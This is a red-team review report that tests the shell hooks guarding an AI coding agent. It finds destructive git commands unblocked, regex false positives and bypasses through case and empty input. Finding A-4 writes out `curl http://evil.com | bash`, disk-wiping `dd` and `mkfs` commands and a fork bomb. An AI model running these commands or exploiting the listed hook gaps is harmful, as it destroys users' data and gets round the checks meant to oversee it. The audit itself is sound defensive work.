# Red Team Verdict: full-hook-review-cycle-2

## Test Results Summary

Executed 40+ adversarial test cases across all 7 hook scripts. Tests covered: quoting bypasses, command chaining, subshell injection, git destructive operations, SQL injection, empty/malformed input, path edge cases, governance path exclusions, and path injection via unquoted heredocs. Post-stop validation ran cleanly.

## Blocking Findings

### B-1. `git checkout -- .`, `git restore .`, `git branch -D`, `git stash drop` are NOT blocked (CRITICAL)

**File:** `.armature/hooks/block-dangerous-commands.sh`
**Lines:** No rule exists for these commands.
**How to trigger:**
```
echo '{"tool_input":{"command":"git checkout -- ."}}' | bash .armature/hooks/block-dangerous-commands.sh
# exits 0 (allowed)
```
**Impact:** `git checkout -- .` silently discards all unstaged changes in the working tree. `git restore .` does the same. `git branch -D` force-deletes a branch including unmerged work. `git stash drop` permanently deletes stashed changes. All four are destructive, non-recoverable operations that the hook claims to guard against (the CLAUDE.md system prompt explicitly instructs Claude not to run these without user request, but the hook provides no mechanical enforcement).
**Severity:** CRITICAL -- data loss on par with `git reset --hard`.

### B-2. `rm -f single-file.txt` is incorrectly blocked (HIGH -- false positive)

**File:** `.armature/hooks/block-dangerous-commands.sh`, line 119
**How to trigger:**
```
echo '{"tool_input":{"command":"rm -f single-file.txt"}}' | bash .armature/hooks/block-dangerous-commands.sh
# exits 2 (blocked)
```
**Root cause:** The regex `-[rRfF]*f[rRfF]*` matches `-f` by itself -- it does not require the `-r` flag to be present. The rule is labeled "rm -rf" but it actually matches `rm -f` (force-delete without recursion), which is a routine operation (e.g., `rm -f .code-dirty` is used in `post-stop.sh` itself). The `all_rm_targets_safe` check then rejects any file not in the safe list.
**Impact:** Agents cannot force-remove any single file unless its basename is in the safe list. This breaks normal cleanup operations. The hook's own sibling `post-stop.sh` uses `rm -f "$DIRTY_MARKER"` which would be blocked if run through this hook.
**Severity:** HIGH -- false positive that blocks legitimate operations.

### B-3. `echo "rm -rf / is dangerous"` is incorrectly blocked (HIGH -- false positive)

**File:** `.armature/hooks/block-dangerous-commands.sh`, line 119
**How to trigger:**
```
echo '{"tool_input":{"command":"echo \"rm -rf / is dangerous\""}}' | bash .armature/hooks/block-dangerous-commands.sh
# exits 2 (blocked)
```
**Root cause:** The regex matches the string "rm -rf" anywhere in the command, including inside quoted strings or echo arguments. It does not distinguish between a command that *executes* `rm -rf` and a command that merely *mentions* it as a string literal.
**Impact:** Agents cannot echo, grep, or log strings containing "rm -rf". While less common, this also means documentation or test scripts that reference the string cannot be tested via bash.
**Severity:** HIGH -- false positive, though narrower blast radius than B-2.

## Advisory Findings

### A-1. Path injection via unquoted heredocs in `post-stop.sh`, `inject-context.sh`, `reinject-context.sh` (MEDIUM)

**Files and lines:**
- `post-stop.sh` line 43: `with open('${REGISTRY}')` inside `<<PYEOF` (unquoted heredoc)
- `post-stop.sh` line 68: `repo_root = '${REPO_ROOT}'` inside `<<PYEOF`
- `post-stop.sh` line 108: `open('${REPO_ROOT}/package.json')` inside inline python
- `inject-context.sh` lines 38, 47, 81, 91: same pattern with `${REGISTRY}` and `${STATE}`
- `reinject-context.sh` lines 55, 59: same pattern with `${JOURNAL}` and `${STATE}`

**What it is:** These heredocs use `<<PYEOF` (unquoted), which means the shell expands `${REGISTRY}`, `${REPO_ROOT}`, etc. before Python sees the code. If `REPO_ROOT` contains a single quote (e.g., a directory named `it's-a-test`), the Python string literal breaks and the script either crashes or executes unintended code.

**Contrast:** `inject-context.sh` line 135 correctly uses `<<'PYEOF'` (quoted heredoc) and passes values via environment variables. `check-required-reading.sh` also correctly uses environment variables. The inconsistency suggests the safe pattern was adopted later but not retrofitted.

**Practical risk:** Low on typical systems (directory names rarely contain single quotes), but the vulnerability is real and the fix is mechanical -- switch to `<<'PYEOF'` and pass paths via `os.environ` as the other hooks already do.

### A-2. `block-config-changes.sh` is case-sensitive: `POLICY_SETTINGS` is not blocked (MEDIUM)

**File:** `.armature/hooks/block-config-changes.sh`, line 60-62
**How to trigger:**
```
echo '{"source":"POLICY_SETTINGS"}' | bash .armature/hooks/block-config-changes.sh
# exits 0 (allowed) with warning
```
**Impact:** If Claude Code ever sends source values in a different case (e.g., `User_Settings`, `USER_SETTINGS`), the block is bypassed. The `case` statement is exact-match only. Whether this is actually exploitable depends on whether the Claude Code runtime normalizes source values -- but defensive coding would lowercase the input before matching.

### A-3. `block-config-changes.sh` fails open on empty/missing source (MEDIUM)

**File:** `.armature/hooks/block-config-changes.sh`, lines 67-69
**Observation:** When `source` is empty or missing, the hook prints a warning and exits 0 (allow). This is intentional ("fail open to avoid false positives") and documented. However, it means a malformed payload with no source field silently bypasses all protection. If the design intent is to protect configuration, fail-closed would be safer.

### A-4. `curl | bash`, `dd`, `mkfs`, fork bombs are not blocked (LOW)

**File:** `.armature/hooks/block-dangerous-commands.sh`
**Observation:** `curl http://evil.com | bash`, `dd if=/dev/zero of=/dev/sda`, `mkfs.ext4 /dev/sda1`, and `:(){ :|:& };:` all pass through unblocked. These are less likely to appear in agentic workflows but represent a defense-in-depth gap. This is LOW severity because Claude Code's own safety layer and OS permissions provide additional barriers, but it is worth noting for completeness.

### A-5. `mark-dirty.sh` has no fallback when python is unavailable (LOW)

**File:** `.armature/hooks/mark-dirty.sh`, lines 22-40
**Observation:** If neither `python3` nor `python` is available, `FILE_PATH` is never set and the hook silently exits 0 without marking anything dirty. The `block-dangerous-commands.sh` hook has a sed fallback for JSON parsing, but `mark-dirty.sh` does not. On a system without python, application code changes would never trigger test runs via the post-stop hook.

### A-6. `inject-context.sh` uses `set -uo pipefail` (no `-e`) while other hooks use `set -euo pipefail` (LOW)

**File:** `.armature/hooks/inject-context.sh`, line 12; `reinject-context.sh`, line 14
**Observation:** The missing `-e` flag means commands in these scripts can fail without aborting the script. This is likely intentional for informational hooks (they should never block), but it is inconsistent with the documentation pattern of the other hooks and could mask errors during development.

## Verdict: FAIL

Three blocking findings must be addressed before merge:

1. **B-1:** Four destructive git commands (`checkout -- .`, `restore .`, `branch -D`, `stash drop`) pass through unblocked.
2. **B-2:** `rm -f` (without `-r`) on non-safe-listed files is incorrectly blocked due to overly broad regex.
3. **B-3:** Commands that *mention* `rm -rf` as a string (e.g., inside echo or grep) are incorrectly blocked due to the same overly broad regex.

## Blocking Issues

- B-1: Add rules for `git checkout -- .`, `git restore .`, `git branch -D`, `git stash drop`
- B-2: Tighten the rm regex on line 119 to require BOTH `-r` and `-f` flags, not just `-f` alone
- B-3: The regex needs to be scoped to match `rm` as the actual command being invoked, not as a substring inside quoted arguments (this is architecturally harder -- may require parsing the command into tokens before applying patterns)
